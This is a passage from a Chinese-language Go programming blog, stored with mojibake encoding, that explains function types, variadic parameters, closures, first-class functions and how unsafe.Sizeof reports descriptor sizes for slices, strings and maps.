int, b string) (results []string, err error)func (c int, d string) (sl []string, err error)// å°†ä¸¤ä¸ªå‡½æ•°ç±»å‹çš„å‚æ•°åä¸è¿”å›å€¼å˜é‡åçœç•¥// func (int, string) ([]string, error)// æ‰€ä»¥å®ƒä»¬æ˜¯ç›¸åŒçš„å‡½æ•°ç±»å‹ æ¯ä¸ªå‡½æ•°å£°æ˜æ‰€å®šä¹‰çš„å‡½æ•°ï¼Œä»…ä»…æ˜¯å¯¹åº”çš„å‡½æ•°ç±»å‹çš„ä¸€ä¸ªå®ä¾‹ï¼Œå°±åƒ var a int = 13 è¿™ä¸ªå˜é‡å£°æ˜è¯­å¥ä¸­ a æ˜¯ int ç±»å‹çš„ä¸€ä¸ªå®ä¾‹ä¸€æ ·ã€‚ åœ¨å‰é¢çš„ç¬”è®°ä¸­ï¼Œä½¿ç”¨å¤åˆç±»å‹å­—é¢å€¼å¯¹ç»“æ„ä½“ç±»å‹å˜é‡è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–çš„å†…å®¹ï¼Œåœ¨å½¢å¼ä¸Šï¼Œå’Œä¸Šé¢è¿™ç§ä½¿ç”¨å˜é‡å£°æ˜æ¥å£°æ˜å‡½æ•°å˜é‡çš„å½¢å¼å¾ˆåƒã€‚ æŠŠè¿™ä¸¤ç§å½¢å¼éƒ½ä»¥æœ€ç®€åŒ–çš„æ ·å­è¡¨ç°å‡ºæ¥ï¼š 12s := T&#123;&#125; // ä½¿ç”¨å¤åˆç±»å‹å­—é¢å€¼å¯¹ç»“æ„ä½“ç±»å‹Tçš„å˜é‡è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–f := func()&#123;&#125; // ä½¿ç”¨å˜é‡å£°æ˜å½¢å¼çš„å‡½æ•°å£°æ˜ è¿™é‡Œï¼ŒT{}è¢«ç§°ä¸ºå¤åˆç±»å‹å­—é¢å€¼ï¼Œå¤„äºåŒæ ·ä½ç½®çš„ func(){} å«â€œå‡½æ•°å­—é¢å€¼ï¼ˆFunction Literalï¼‰â€ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°å­—é¢å€¼ç”±å‡½æ•°ç±»å‹ä¸å‡½æ•°ä½“ç»„æˆï¼Œå®ƒç‰¹åˆ«åƒä¸€ä¸ªæ²¡æœ‰å‡½æ•°åçš„å‡½æ•°å£°æ˜ï¼Œå› æ­¤ä¹Ÿå«å®ƒåŒ¿åå‡½æ•°ã€‚åŒ¿åå‡½æ•°åœ¨ Go ä¸­ç”¨é€”å¾ˆå¹¿ï¼Œç¨åæˆ‘ä»¬ä¼šç»†è®²ã€‚ Go å‡½æ•°ä¸å‡½æ•°å£°æ˜å‚æ•°åˆ—è¡¨Go è¯­è¨€ä¸­ï¼Œå‡½æ•°å‚æ•°ä¼ é€’é‡‡ç”¨æ˜¯å€¼ä¼ é€’çš„æ–¹å¼ï¼Œæ‰€è°“â€œå€¼ä¼ é€’â€ï¼Œå°±æ˜¯å°†å®é™…å‚æ•°åœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºé€ä½æ‹·è´ï¼ˆBitwise Copyï¼‰åˆ°å½¢å¼å‚æ•°ä¸­ã€‚ å¯¹äºåƒæ•´å‹ã€æ•°ç»„ã€ç»“æ„ä½“è¿™ç±»ç±»å‹ï¼Œå®ƒä»¬çš„å†…å­˜è¡¨ç¤ºå°±æ˜¯å®ƒä»¬è‡ªèº«çš„æ•°æ®å†…å®¹ï¼Œå› æ­¤å½“è¿™äº›ç±»å‹ä½œä¸ºå®å‚ç±»å‹æ—¶ï¼Œå€¼ä¼ é€’æ‹·è´çš„å°±æ˜¯å®ƒä»¬è‡ªèº«ï¼Œä¼ é€’çš„å¼€é”€ä¹Ÿä¸å®ƒä»¬è‡ªèº«çš„å¤§å°æˆæ­£æ¯”ã€‚ ä½†æ˜¯åƒ stringã€åˆ‡ç‰‡ã€map è¿™äº›å±äºå¼•ç”¨ç±»å‹ï¼Œå®ƒä»¬çš„å†…å­˜è¡¨ç¤ºå¯¹åº”çš„æ˜¯å®ƒä»¬æ•°æ®å†…å®¹çš„â€œæè¿°ç¬¦â€ã€‚å½“è¿™äº›ç±»å‹ä½œä¸ºå®å‚ç±»å‹æ—¶ï¼Œå€¼ä¼ é€’æ‹·è´çš„ä»…ä»…æ˜¯æ•°æ®å†…å®¹çš„â€œæè¿°ç¬¦â€ï¼Œä¸åŒ…æ‹¬æ•°æ®å†…å®¹æœ¬èº«ï¼Œå› æ­¤è¿™äº›ç±»å‹ä¼ é€’çš„å¼€é”€æ˜¯å›ºå®šçš„ï¼Œä¸æ•°æ®å†…å®¹å¤§å°æ— å…³ï¼Œè¿™ç§æ–¹å¼è¢«æˆä¸ºæµ…æ‹·è´ã€‚ ä¸è¿‡å‡½æ•°å‚æ•°çš„ä¼ é€’ä¹Ÿæœ‰ä¸¤ä¸ªä¾‹å¤–ï¼Œå½“å‡½æ•°çš„å½¢å‚ä¸ºæ¥å£ç±»å‹ï¼Œæˆ–è€…å½¢å‚æ˜¯å˜é•¿å‚æ•°æ—¶ï¼Œç®€å•çš„å€¼ä¼ é€’å°±ä¸èƒ½æ»¡è¶³è¦æ±‚äº†ã€‚ å¯¹äºç±»å‹ä¸ºæ¥å£ç±»å‹çš„å½¢å‚ï¼ŒGo ç¼–è¯‘å™¨ä¼šæŠŠä¼ é€’çš„å®å‚èµ‹å€¼ç»™å¯¹åº”çš„æ¥å£ç±»å‹å½¢å‚ï¼›å¯¹äºä¸ºå˜é•¿å‚æ•°çš„å½¢å‚ï¼ŒGo ç¼–è¯‘å™¨ä¼šå°†é›¶ä¸ªæˆ–å¤šä¸ªå®å‚æŒ‰ä¸€å®šå½¢å¼è½¬æ¢ä¸ºå¯¹åº”çš„å˜é•¿å½¢å‚ã€‚ ä¸‹é¢é€šè¿‡ä¸€æ®µç¤ºä¾‹ä»£ç æ¥è¯´æ˜å˜é•¿å‚æ•°çš„å½¢å‚ï¼š 1234567891011121314151617func myAppend(sl []int, elems ...int) []int &#123; fmt.Printf(\"%T\\n\", elems) // []int if len(elems) == 0 &#123; println(\"no elems to append\") return sl &#125; sl = append(sl, elems...) return sl&#125;func main() &#123; sl := []int&#123;1, 2, 3&#125; sl = myAppend(sl) // no elems to append fmt.Println(sl) // [1 2 3] // è°ƒç”¨ myAppend å‡½æ•°ï¼Œä¼ é€’å®å‚ 4ï¼Œ5ï¼Œ6 sl = myAppend(sl, 4, 5, 6) fmt.Println(sl) // [1 2 3 4 5 6]&#125; é‡ç‚¹çœ‹ä¸€ä¸‹ä»£ç ä¸­çš„ myAppend å‡½æ•°ï¼Œåœ¨ append å‡½æ•°çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ‰©å±•ï¼Œæ”¯æŒå˜é•¿å‚æ•°ã€‚ é€šè¿‡æ‰“å°å˜é•¿å‚æ•°çš„ç±»å‹ï¼Œå¯ä»¥çœ‹åˆ°ç±»å‹æ˜¯ []intï¼Œè¶³ä»¥è¯´æ˜å˜é•¿å‚æ•°å®é™…ä¸Šæ˜¯é€šè¿‡åˆ‡ç‰‡æ¥å®ç°çš„ã€‚ è¿”å›å€¼å’Œå…¶ä»–ä¸»æµé™æ€ç±»å‹è¯­è¨€ï¼ŒGo å‡½æ•°æ”¯æŒå¤šè¿”å›å€¼ï¼Œå¤šè¿”å›å€¼å¯ä»¥è®©å‡½æ•°å°†æ›´å¤šç»“æœä¿¡æ¯è¿”å›ç»™å®ƒçš„è°ƒç”¨è€…ã€‚ å‡½æ•°è¿”å›å€¼åˆ—è¡¨ä»å½¢å¼ä¸Šçœ‹ä¸»è¦æœ‰ä¸‰ç§ï¼š 123func foo() // æ— è¿”å›å€¼func foo() error // ä»…æœ‰ä¸€ä¸ªè¿”å›å€¼func foo() (int, string, error) // æœ‰2æˆ–2ä¸ªä»¥ä¸Šè¿”å›å€¼ å‰é¢æåˆ°è¿‡ï¼Œå¦‚æœä¸€ä¸ªè¿”å›å€¼æ—¢æœ‰ç±»å‹ï¼Œä¹Ÿæœ‰åç§°ï¼Œé‚£ä¹ˆè¿™ç±»è¿”å›å€¼å°±è¢«æˆä¸ºå…·åè¿”å›å€¼ã€‚ Go æ ‡å‡†åº“ä»¥åŠå¤§å¤šæ•°é¡¹ç›®ä»£ç ä¸­çš„å‡½æ•°ï¼Œéƒ½é€‰æ‹©äº†ä½¿ç”¨æ™®é€šçš„éå…·åè¿”å›å€¼å½¢å¼ã€‚ æ‰€ä»¥å¤šæ•°æƒ…å†µä¸‹ï¼Œåªéœ€å£°æ˜è¿”å›å€¼çš„ç±»å‹å³å¯ï¼Œæ— éœ€ä½¿ç”¨å…·åè¿”å›å€¼å½¢å¼ã€‚ ä¸€ç­‰å…¬æ°‘å‡½æ•°ä½œä¸ºâ€œä¸€ç­‰å…¬æ°‘â€ï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œå æ®ç€é‡è¦çš„åœ°ä½ã€‚è¦çŸ¥é“ï¼Œå¹¶ä¸æ˜¯åœ¨æ‰€æœ‰ç¼–ç¨‹è¯­è¨€ä¸­å‡½æ•°éƒ½æ˜¯â€œä¸€ç­‰å…¬æ°‘â€ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯ç¼–ç¨‹è¯­è¨€çš„â€œä¸€ç­‰å…¬æ°‘â€å‘¢ï¼Ÿ å¦‚æœä¸€é—¨ç¼–ç¨‹è¯­è¨€å¯¹æŸç§è¯­è¨€å…ƒç´ çš„åˆ›å»ºå’Œä½¿ç”¨æ²¡æœ‰é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åƒå¯¹å¾…å€¼ï¼ˆvalueï¼‰ä¸€æ ·å¯¹å¾…è¿™ç§è¯­æ³•å…ƒç´ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç§°è¿™ç§è¯­æ³•å…ƒç´ æ˜¯è¿™é—¨ç¼–ç¨‹è¯­è¨€çš„â€œä¸€ç­‰å…¬æ°‘â€ã€‚æ‹¥æœ‰â€œä¸€ç­‰å…¬æ°‘â€å¾…é‡çš„è¯­æ³•å…ƒç´ å¯ä»¥å­˜å‚¨åœ¨å˜é‡ä¸­ï¼Œå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ï¼Œå¯ä»¥åœ¨å‡½æ•°å†…éƒ¨åˆ›å»ºå¹¶å¯ä»¥ä½œä¸ºè¿”å›å€¼ä»å‡½æ•°è¿”å›ã€‚â€”â€”wikipedia åŸºäºè¿™ä¸ªè§£é‡Šï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ Go è¯­è¨€çš„å‡½æ•°ä½œä¸ºâ€œä¸€ç­‰å…¬æ°‘â€ï¼Œè¡¨ç°å‡ºçš„å„ç§è¡Œä¸ºç‰¹å¾ã€‚ å‡½æ•°å¯ä»¥å­˜å‚¨åœ¨å˜é‡ä¸­å…³äºè¿™ä¸€ç‚¹ï¼Œå…¶å®å‰é¢å·²ç»éªŒè¯è¿‡äº†ï¼Œä¸‹é¢ç”¨ä¸€ä¸ªä¾‹å­å†ä¸€æ¬¡ç†è§£ä¸€ä¸‹ï¼š 123456789var ( myFprintf = func(w io.Writer, format string, a ...interface&#123;&#125;) (int, error) &#123; return fmt.Fprintf(w, format, a...) &#125;)func main() &#123; fmt.Printf(\"%T\\n\", myFprintf) // myFprintft çš„ç±»å‹ func(io.Writer, string, ...interface &#123;&#125;) (int, error) myFprintf(os.Stdout, \"%s\\n\", \"Hello, Go\") // è°ƒç”¨ myFprintft è¾“å‡ºHelloï¼ŒGo&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™ myFprintf å˜é‡ï¼Œé€šè¿‡æ‰“å°å˜é‡ç±»å‹å’Œè°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°é¢„æœŸç»“æœæ˜¯ä¸€è‡´çš„ã€‚ å°†å‡½æ•°ä½œä¸ºè¿”å›å€¼è¿”å›Go å‡½æ•°ä¸ä»…å¯ä»¥åœ¨å‡½æ•°å¤–åˆ›å»ºï¼Œè¿˜å¯ä»¥åœ¨å‡½æ•°å†…åˆ›å»ºã€‚è€Œä¸”ç”±äºå‡½æ•°å¯ä»¥å­˜å‚¨åœ¨å˜é‡ä¸­ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿå¯ä»¥åœ¨åˆ›å»ºåï¼Œä½œä¸ºå‡½æ•°è¿”å›å€¼è¿”å›ï¼š 1234567891011121314151617// æ³¨æ„è¿”å›å€¼çš„ç±»å‹æ˜¯ å‡½æ•°ç±»å‹func setup(task string) func() &#123; println(\"do some setup stuff for\", task) return func() &#123; println(\"do some teardown stuff for\", task) &#125;&#125;func main() &#123; // åˆ›å»ºä¸€ä¸ªå˜é‡æ¥å—è¿”å›å€¼ teardown := setup(\"demo\") defer teardown() println(\"do some bussiness stuff\")&#125;// do some setup stuff for demo// do some bussiness stuff// do some teardown stuff for demo å’Œå‰é¢çœ‹åˆ°çš„åŒ¿åå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°ä½¿ç”¨äº†å®šä¹‰å®ƒçš„å‡½æ•° setup çš„å±€éƒ¨å˜é‡ taskï¼Œè¿™æ ·çš„åŒ¿åå‡½æ•°åœ¨ Go ä¸­ä¹Ÿè¢«ç§°ä¸ºé—­åŒ…ï¼ˆClosureï¼‰ã€‚ é—­åŒ…çš„æœ¬è´¨å°±æ˜¯åŒ¿åå‡½æ•°ï¼Œä¸è¿‡å¯ä»¥å¼•ç”¨å®ƒçš„åŒ…è£¹å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºå®ƒä»¬çš„å‡½æ•°ä¸­å®šä¹‰çš„å˜é‡ï¼Œè¿™äº›å˜é‡åœ¨åŒ…è£¹å‡½æ•°å’ŒåŒ¿åå‡½æ•°ä¹‹é—´å…±äº«ï¼Œåªè¦é—­åŒ…å¯ä»¥è¢«è®¿é—®ï¼Œè¿™äº›å…±äº«çš„å˜é‡å°±ä¼šç»§ç»­å­˜åœ¨ã€‚ ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°å‡½æ•°é™¤äº†å¯ä»¥å­˜å‚¨åœ¨å˜é‡ä¸­ã€ä½œä¸ºè¿”å›å€¼è¿”å›ã€è¿˜å¯ä»¥ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚ 1time.AfterFunc(time.Second*2, func() &#123; println(\"timer fired\") &#125;) æ‹¥æœ‰è‡ªå·±çš„ç±»å‹ä½œä¸ºä¸€ç­‰å…¬æ°‘çš„æ•´å‹å€¼æ‹¥æœ‰è‡ªå·±çš„ç±»å‹ intï¼ŒåŒæ ·çš„ï¼Œä½œä¸ºä¸€ç­‰å…¬æ°‘çš„å‡½æ•°ï¼Œä¹Ÿæ‹¥æœ‰è‡ªå·±çš„ç±»å‹ï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„å‡½æ•°ç±»å‹ï¼ˆç”± func å…³é”®å­—ã€å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼åˆ—è¡¨å…±åŒæ„æˆï¼‰ã€‚ å¯ä»¥åŸºäºå‡½æ•°ç±»å‹æ¥è‡ªå®šä¹‰ç±»å‹ï¼Œå°±åƒåŸºäºæ•´å‹ã€å­—ç¬¦ä¸²ç±»å‹ç­‰ç±»å‹æ¥è‡ªå®šä¹‰ç±»å‹ä¸€æ ·ã€‚ä¸‹é¢ä»£ç ä¸­çš„ HandlerFuncã€visitFunc å°±æ˜¯ Go æ ‡å‡†åº“ä¸­ï¼ŒåŸºäºå‡½æ•°ç±»å‹è¿›è¡Œè‡ªå®šä¹‰çš„ç±»å‹ï¼š 1234567// $GOROOT/src/net/http/server.go// å‡½æ•°ç±»å‹æ˜¯ func(ResponseWriter, *Request)type HandlerFunc func(ResponseWriter, *Request)// $GOROOT/src/sort/genzfunc.go// å‡½æ•°ç±»å‹æ˜¯ func(ast.Node) ast.Visitortype visitFunc func(ast.Node) ast.Visitor æ€»ç»“ å‡½æ•°æ”¯æŒå¤šè¿”å›å€¼ å‡½æ•°å‚æ•°ä¸è¿è¡Œå®šä¹‰é»˜è®¤å€¼ å¯¹äºåƒæ•´å‹ã€æ•°ç»„ã€ç»“æ„ä½“è¿™ç±»ç±»å‹æ˜¯å€¼ä¼ é€’ï¼Œå¯¹äºstringã€åˆ‡ç‰‡ã€map è¿™äº›ç±»å‹åˆ™æ˜¯å¼•ç”¨ä¼ é€’ å‡½æ•°ç±»å‹ç”± func å…³é”®å­— + å‚æ•°åˆ—è¡¨ + è¿”å›å€¼åˆ—è¡¨ç»„æˆ; å‡½æ•°ç­¾åç”±å‚æ•°åˆ—è¡¨ + è¿”å›å€¼åˆ—è¡¨ç»„æˆ; å¦‚æœä¸¤ä¸ªå‡½æ•°ç­¾åç›¸åŒï¼Œåˆ™å‡½æ•°ç±»å‹ç›¸åŒ Go è¯­è¨€çš„å‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘ï¼Œå…·å¤‡ä¸€åˆ‡ä½œä¸ºâ€œä¸€ç­‰å…¬æ°‘â€çš„è¡Œä¸ºç‰¹å¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”unsafe.Sizeof","slug":"go-language-study-notes-unsafe-Sizeof","date":"2022-10-29T14:10:51.000Z","updated":"2023-02-18T03:28:33.597Z","comments":true,"path":"go-language-study-notes-unsafe-Sizeof/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-unsafe-Sizeof/","excerpt":"åœ¨ Go è¯­è¨€ä¸­ï¼Œlen å‡½æ•°å¯ä»¥ç”¨äºè·å–ä¸€ä¸ªå˜é‡çš„é•¿åº¦ï¼Œunsafe.Sizeof å‡½æ•°ç”¨äºè·å–ä¸€ä¸ªæ•°ç»„å˜é‡çš„æ€»å¤§å°ã€‚","text":"åœ¨ Go è¯­è¨€ä¸­ï¼Œlen å‡½æ•°å¯ä»¥ç”¨äºè·å–ä¸€ä¸ªå˜é‡çš„é•¿åº¦ï¼Œunsafe.Sizeof å‡½æ•°ç”¨äºè·å–ä¸€ä¸ªæ•°ç»„å˜é‡çš„æ€»å¤§å°ã€‚ len å‡½æ•°æ¯”è¾ƒç®€å•å¥½ç†è§£ï¼Œä½¿ç”¨è¿‡ç¨‹ä¸­åŸºæœ¬ä¸Šä¸ä¼šé‡åˆ°é—®é¢˜ï¼Œè¿™ç¯‡ç¬”è®°ä¸»è¦ä»‹ç» unsafe.Sizeofã€‚ ä¸€ä¸ªé—®é¢˜å…ˆæ¥çœ‹çœ‹è¿™æ®µç¤ºä¾‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package mainimport ( \"fmt\" \"unsafe\")type run interface &#123;&#125;type Person struct &#123; Name string Age int Gender int //Height int&#125;type Empty struct &#123;&#125;func structFunc() &#123; person1 := Person&#123; Name: \"yumi\", Age: 23, Gender: 0, //Height: 165, &#125; // ç»“æ„ä½“å ç”¨å†…å­˜å¤§å°å–å†³äºç»„æˆç»“æ„ä½“çš„å­—æ®µå¤§å°ä¹‹å’Œï¼Œå› ä¸ºç©ºç»“æ„ä½“æ²¡æœ‰å­—æ®µï¼Œæ‰€ä»¥æ€»å¤§å°æ˜¯é›¶ã€‚ empty := Empty&#123;&#125; fmt.Println(\"ç©ºç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(empty)) // 0 fmt.Println(\"åˆå§‹åŒ–ç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(person1)) // 32 person2 := Person&#123;&#125; fmt.Println(\"é›¶å€¼åˆå§‹åŒ–çš„ç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(person2)) // 32 fmt.Println(\"------------------------\")&#125;func interfaceFunc() &#123; var interface1 interface&#123;&#125; fmt.Println(\"ç©ºæ¥å£çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(interface1)) // 16 var interface2 run fmt.Println(\"æ¥å£çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(interface2)) // 16 fmt.Println(\"------------------------\")&#125;func pointerFunc() &#123; var ep int i := \"123\" ip := &amp;i s := \"hello\" sp := &amp;s fmt.Println(\"ç©ºæŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(ep)) // 8 fmt.Println(\"æ•´å‹æŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(ip)) // 8 fmt.Println(\"string æŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(sp)) // 8 fmt.Println(\"------------------------\")&#125;func arrayFunc() &#123; nums := [...]int&#123;1: 2, 3: 4&#125; fmt.Println(\"æ•°ç»„çš„é•¿åº¦ï¼š\", len(nums)) // 4 for _, v := range nums &#123; println(\"v = \", v) // [0, 2, 0, 4] &#125; fmt.Println(\"æ•°ç»„çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(nums)) // 32 fmt.Println(\"------------------------\")&#125;func stringFunc() &#123; str := \"è¿™å¥è¯å…±ä¸ƒä¸ªå­—\" fmt.Println(\"string çš„é•¿åº¦ï¼š\", len(str)) // 3 * 7 = 21 for _, v := range str &#123; fmt.Printf(\"v = %c \\n\", v) &#125; fmt.Println(\"string çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(str)) // 16 fmt.Println(\"------------------------\")&#125;func sliceFunc() &#123; nums := []int&#123;1, 3, 5, 7, 9, 11&#125; fmt.Println(\"åˆ‡ç‰‡çš„é•¿åº¦ï¼š\", len(nums)) // 6 for _, v := range nums &#123; println(\"v = \", v) // [1, 2, 5, 7, 9, 11] &#125; fmt.Println(\"åˆ‡ç‰‡çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(nums)) // 24 fmt.Println(\"------------------------\")&#125;func mapFunc() &#123; m := map[string]int&#123; \"yumi\": 23, \"amy\": 19, \"lucy\": 22, \"ben\": 24, \"may\": 28, &#125; fmt.Println(\"map çš„é•¿åº¦ï¼š\", len(m)) // 5 for k, v := range m &#123; println(\"k = \", k) // yumiã€amyã€lucyã€benã€amy println(\"v = \", v) // 23ã€19ã€22ã€24ã€28 &#125; fmt.Println(\"map çš„æ€»å¤§å°æ˜¯ï¼š\", unsafe.Sizeof(m)) // 8 fmt.Println(\"------------------------\")&#125;func main() &#123; arrayFunc() sliceFunc() stringFunc() mapFunc() structFunc() interfaceFunc() pointerFunc()&#125; æ‰§è¡Œä¹‹åï¼Œå¾—åˆ°çš„è¾“å‡ºå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950æ•°ç»„çš„é•¿åº¦ï¼š 4v = 0v = 2v = 0v = 4æ•°ç»„çš„æ€»å¤§å°æ˜¯ï¼š 32------------------------åˆ‡ç‰‡çš„é•¿åº¦ï¼š 6v = 1v = 3v = 5v = 7v = 9v = 11åˆ‡ç‰‡çš„æ€»å¤§å°æ˜¯ï¼š 24------------------------string çš„é•¿åº¦ï¼š 21v = è¿™ v = å¥ v = è¯ v = å…± v = ä¸ƒ v = ä¸ª v = å­— string çš„æ€»å¤§å°æ˜¯ï¼š 16------------------------map çš„é•¿åº¦ï¼š 5k = mayv = 28k = yumiv = 23k = amyv = 19k = lucyv = 22k = benv = 24map çš„æ€»å¤§å°æ˜¯ï¼š 8------------------------ç©ºç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š 0åˆå§‹åŒ–ç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š 32é›¶å€¼åˆå§‹åŒ–çš„ç»“æ„ä½“çš„æ€»å¤§å°æ˜¯ï¼š 32------------------------ç©ºæ¥å£çš„æ€»å¤§å°æ˜¯ï¼š 16æ¥å£çš„æ€»å¤§å°æ˜¯ï¼š 16------------------------ç©ºæŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š 8æ•´å‹æŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š 8string æŒ‡é’ˆçš„æ€»å¤§å°æ˜¯ï¼š 8------------------------ ä¼šä¸ä¼šæœ‰äº›æ„å¤–ï¼Ÿ åˆ‡ç‰‡ã€stringã€map çš„æ€»å¤§å°æ€ä¹ˆæœ‰ç‚¹å¥‡æ€ªï¼Ÿæ€ä¹ˆæ˜¯ 24ã€16 å’Œ 8ï¼Ÿ sizeofå›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ unsafe.sizeof è¿™ä¸ªå‡½æ•°çš„å®šä¹‰ï¼š 123456789// $GOROOT/src/unsafe/unsafe.go// Sizeof takes an expression x of any type and returns the size in bytes// of a hypothetical variable v as if v was declared via var v = x.// The size does not include any memory possibly referenced by x.// For instance, if x is a slice, Sizeof returns the size of the slice// descriptor, not the size of the memory referenced by the slice.// The return value of Sizeof is a Go constant.func Sizeof(x ArbitraryType) uintptr å¤§æ„å°±æ˜¯ï¼šSizeof æ¥å—ä»»ä½•ç±»å‹çš„è¡¨è¾¾å¼ xï¼Œå¹¶è¿”å›ä¸€ä¸ªå‡è®¾å˜é‡ v çš„å­—èŠ‚å¤§å°ï¼Œå°±å¥½åƒ v æ˜¯é€šè¿‡ var v=x å£°æ˜çš„ï¼Œè¯¥å¤§å°ä¸åŒ…æ‹¬ x å¯èƒ½å¼•ç”¨çš„ä»»ä½•å†…å­˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ x æ˜¯ä¸€ä¸ªåˆ‡ç‰‡ï¼ŒSizeof è¿”å›åˆ‡ç‰‡æè¿°ç¬¦çš„å¤§å°ï¼Œè€Œä¸æ˜¯åˆ‡ç‰‡å¼•ç”¨çš„å†…å­˜å¤§å°ã€‚ ä»€ä¹ˆæ˜¯æè¿°ç¬¦å‘¢ï¼Ÿä»¥åˆ‡ç‰‡ä¸ºä¾‹ï¼Œå°±æ˜¯å®ƒæœ¬èº«å¹¶ä¸çœŸæ­£å­˜å‚¨å­—ç¬¦ä¸²æ•°æ®ï¼Œè€Œä»…æ˜¯ç”±ä¸€ä¸ªæŒ‡å‘åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆã€åˆ‡ç‰‡é•¿åº¦å’Œåˆ‡ç‰‡æœ€å¤§å®¹é‡ç»„æˆã€‚ çœ‹åˆ°è¿™é‡Œä¼šä¸ä¼šæ¸…æ™°ä¸€äº›ï¼Œæœ‰æ²¡æœ‰æƒ³èµ·ä»€ä¹ˆï¼Œæ²¡é”™ï¼Œåˆ‡ç‰‡çš„æ•°æ®ç»“æ„åˆšå¥½æ˜¯ç”±è¿™ä¸‰éƒ¨åˆ†ç»„æˆï¼š arrayï¼šæŒ‡å‘åº•å±‚æ•°ç»„çš„æŒ‡é’ˆï¼Œç±»å‹ä¸º uintptrï¼Œå ç”¨å…«ä¸ªå­—èŠ‚ lenï¼šåˆ‡ç‰‡çš„é•¿åº¦ï¼Œç±»å‹ä¸º intï¼Œå ç”¨å…«ä¸ªå­—èŠ‚ capï¼šåˆ‡ç‰‡çš„æœ€å¤§å®¹é‡ï¼Œç±»å‹ä¸º intï¼Œå ç”¨å…«ä¸ªå­—èŠ‚ æ‰€ä»¥ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œåˆ‡ç‰‡å˜é‡çš„æ€»å¤§å°å°±æ˜¯ 8 + 8 + 8 = 24 ä¸ªå­—èŠ‚ã€‚ string ç±»å‹ä¹Ÿæ˜¯ä¸€æ ·çš„åˆ†ææ–¹å¼ï¼Œå®ƒçš„æè¿°ç¬¦æ˜¯ç”±ä¸€ä¸ªæŒ‡å‘åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆå’Œå­—ç¬¦ä¸²çš„é•¿åº¦ç»„æˆã€‚ string çš„æ•°æ®ç»“æ„ï¼š Dataï¼šæŒ‡å‘åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆï¼Œç±»å‹ä¸º uintptrï¼Œå ç”¨å…«ä¸ªå­—èŠ‚ Lenï¼šå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç±»å‹ä¸º intï¼Œå ç”¨å…«ä¸ªå­—èŠ‚ string å˜é‡çš„æ€»å¤§å°å°±æ˜¯ 8 + 8 = 16 ä¸ªå­—èŠ‚ã€‚ ç»“æ„ä½“ä½œä¸ºç›´æ¥å­˜å‚¨è‡ªèº«æ•°æ®çš„ç±»å‹ï¼Œå®ƒå’Œæ•°ç»„åˆæœ‰æ‰€ä¸åŒï¼Œè¿™æ˜¯å› ä¸ºç»“æ„ä½“æ˜¯ç”±è‹¥å¹²ä¸ªå­—æ®µï¼ˆfieldï¼‰èšåˆè€Œæˆï¼Œæ¯ä¸ªå­—æ®µéƒ½æœ‰è‡ªå·±çš„ç±»å‹ï¼Œæ‰€ä»¥ç»“æ„ä½“å ç”¨å†…å­˜å¤§å°å–å†³äºç»„æˆç»“æ„ä½“çš„å„å­—æ®µå¤§å°ä¹‹å’Œã€‚ è¿˜æ˜¯ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼ŒPerson ç»“æ„ä½“æ˜¯ç”±ä¸€ä¸ª 